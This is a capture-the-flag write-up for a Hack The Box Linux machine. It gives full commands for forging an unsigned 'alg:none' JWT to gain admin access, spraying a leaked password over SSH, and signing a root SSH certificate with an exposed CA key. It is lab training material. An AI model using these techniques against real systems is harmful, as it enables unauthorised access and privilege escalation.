<h1 style="color:blue;">Principal Machine</h1>

**Platform**: Hack The Box

**Author**: 0xL0m4

**Category**: Linux (Medium)

<img width="1592" height="197" alt="image" src="https://github.com/user-attachments/assets/1e50fa6f-710e-4c3a-9e2c-ed8455c7a176" />


## Overview

Principal is a Linux machine exposing a web application built with pac4j.  

A vulnerable JWT implementation allows administrator access, which leads to SSH credentials disclosure.

Finally, a misconfigured OpenSSH CA setup allows privilege escalation to root.

## Tools Used

* Nmap
* Burp Suite
* Browser Developer Tools
* NetExec (nxc)
* OpenSSH
* [Timestamps converter](https://www.epochconverter.com/)
* [JWT encoder](https://jwt.io/)

## Steps

### 1. Initial Recon

First, add the machine hostname to your /etc/hosts file.

```bash
echo "<MACHINE_IP> principal.htb" | sudo tee -a /etc/hosts
```

Next, perform an Nmap scan:

```bash
nmap -Pn principal.htb
```

Two open ports:
```
22/tcp    open    ssh
8080/tcp  open    http-proxy
```

### 2. Exploring the website

Opening the web application presents a login page.

In the footer, I noticed:

```
v1.2.0 | Powered by pac4j
```

<img width="1920" height="857" alt="image" src="https://github.com/user-attachments/assets/597c4e40-d60d-4be6-b1c3-257fa41a7062" />

pac4j is an open-source Java security engine that provides authentication and authorization for web applications. It supports several authentication mechanisms such as OAuth, SAML, LDAP, JWT, and more.

After searching for this version, I found that it is vulnerable to JWT "alg:none" authentication bypass, where the server accepts unsigned JWT tokens instead of verifying their signatures.

### 3. Analyzing the JavaScript

While browsing the application files, I found:

```
/static/js/app.js
```

The application uses JWT tokens for authentication and determines the current user's privileges entirely from the token.


<img width="1920" height="856" alt="image" src="https://github.com/user-attachments/assets/ac9d1bab-70db-4986-986b-8493a84b51eb" />


Several API endpoints require authentication, including:

```
/api/dashboard
/api/settings
/api/users
```

The JavaScript also revealed the expected JWT claims (schema):

| Claim | Description                 |
| ----- | --------------------------- |
| sub   | Username                    |
| role  | User role (e.g. ROLE_ADMIN) |
| iss   | principal-platform          |
| iat   | Issued At (epoch :Unix timestamp)  |
| exp   | Expiration time (epoch :Unix timestamp)         |

Since pac4j accepts tokens signed with alg:none, I could simply forge my own token.

<img width="1920" height="855" alt="image" src="https://github.com/user-attachments/assets/61723e82-9e74-431f-a111-0033df5b4308" />



### 4. Forging an administrator JWT

I generated the timestamps using:

```
https://www.epochconverter.com/
```

Then generated a JWT using:

```
https://jwt.io/
```

Header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload:

```json
{
  "sub": "admin",
  "role": "ROLE_ADMIN",
  "iss": "principal-platform",
  "iat": <timestamp>,
  "exp": <future_timestamp>
}
```

Since the algorithm is none, the token contains no signature.

I added the forged JWT to my requests and attempted to access an administrator endpoint.


### 5. Accessing APIs

Requesting:

```
/api/settings
```

The response contained several sensitive configuration values, including:

```
Encryption Key:
D3pl0y_$$H_Now42!
```

It also revealed that the application stores its SSH configuration inside:

```
/opt/principal/ssh
```

<img width="1261" height="782" alt="image" src="https://github.com/user-attachments/assets/e5fb7ac1-97eb-4a31-b71a-11ff73e66597" />


Next, I queried:

```
/api/users
```

which returned all application users.

I saved them into a file:

```
users.txt
```


### 6. SSH password spraying

Now I had:

* A list of usernames
* An encryption key 

I decided to perform password spraying using NetExec.

```bash
nxc ssh principal.htb -u users.txt -p 'D3pl0y_$$H_Now42!'
```

The results showed svc-deploy was using that password.

<img width="1677" height="187" alt="image" src="https://github.com/user-attachments/assets/2f6e0da6-3436-4d26-8ab6-60f76ddff36e" />


I logged in successfully through SSH.

<img width="1921" height="327" alt="image" src="https://github.com/user-attachments/assets/7ec5b7aa-fce8-441b-b243-0611c86e95d0" />



### 7. Get the user flag

After logging in:

```bash
cat user.txt
```

The user flag was successfully retrieved.

<img width="1920" height="116" alt="image" src="https://github.com/user-attachments/assets/e2ec752a-4fac-4cfb-ba78-5274c60ca9d5" />


### 8. Enumerating the SSH configuration (Privilege Escalation)

Inside the system I noticed:

```
/opt/principal/ssh
```

Listing the directory showed:

```
ca
ca.pub
README.txt
```

<img width="1920" height="252" alt="image" src="https://github.com/user-attachments/assets/ab2e18d8-3633-4a7f-aa15-7d1005921d04" />

#

<img width="1920" height="691" alt="image" src="https://github.com/user-attachments/assets/2550b2fa-4d36-413f-9c5f-8413e3293816" />


The README contained:

```
use deploy.sh
```

Unfortunately, the script wasn't executable for my user.

Instead, I moved on to reviewing the SSH server configuration.

```
cd /etc/ssh/sshd_config.d
```

<img width="1920" height="262" alt="image" src="https://github.com/user-attachments/assets/a01eebde-ddcc-415f-9d80-e625ea218967" />

```
cat 60-principal.conf
```

The configuration contained:

```
PubkeyAuthentication yes                    --> Public key authentication is enabled.
PasswordAuthentication yes                  --> Password authentication is enabled.
PermitRootLogin prohibit-password           --> Root login using passwords is disabled.

TrustedUserCAKeys /opt/principal/ssh/ca.pub --> The server trusts certificates signed by /opt/principal/ssh/ca.pub
```

However, something important was missing.

There was no AuthorizedPrincipalsFile or AuthorizedPrincipalsCommand configured.

This means any user certificate signed by the trusted CA is accepted.

Since I already had access to the CA private key:

```
/opt/principal/ssh/ca
```

I could sign my own SSH key as root.

### 9. Creating a trusted SSH certificate

First, generate a new key pair:

```bash
ssh-keygen -f /tmp/keyssh -N ""
```

<img width="1920" height="367" alt="image" src="https://github.com/user-attachments/assets/e2b7d678-795d-4715-a5bd-537096d9e4e4" />


Next, sign the public key using the trusted CA:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "blabla" -n root /tmp/keyssh.pub
```

* -s --> CA private key used to sign the certificate.
* -I --> Certificate identity.
* -n --> Principal embedded inside the certificate (root).


To verify the generated certificate:

```bash
ssh-keygen -L -f /tmp/keyssh-cert.pub
```

The certificate now contained the root principal.

<img width="1920" height="347" alt="image" src="https://github.com/user-attachments/assets/23a632dc-c248-4315-9ea8-94336e1f2a63" />


### 10. Logging in as root

Finally, authenticate using the signed certificate:

```bash
ssh -i /tmp/keyssh root@localhost
```

The SSH server accepted the certificate immediately.

Checking my privileges:

```bash
id
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Root access was successfully obtained.

### 11. Get the root flag

Finally:

```bash
cat /root/root.txt
```

<img width="1920" height="343" alt="VirtualBox_kali-linux-2025 3-virtualbox-amd64_02_07_2026_02_36_40" src="https://github.com/user-attachments/assets/ff6a19ca-1a4a-4339-bb32-6aab28900825" />

Voilaaaa!!

The root flag was successfully retrieved.

#
[The challenge link](https://app.hackthebox.com/machines/Principal?sort_by=created_at&sort_type=desc)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.

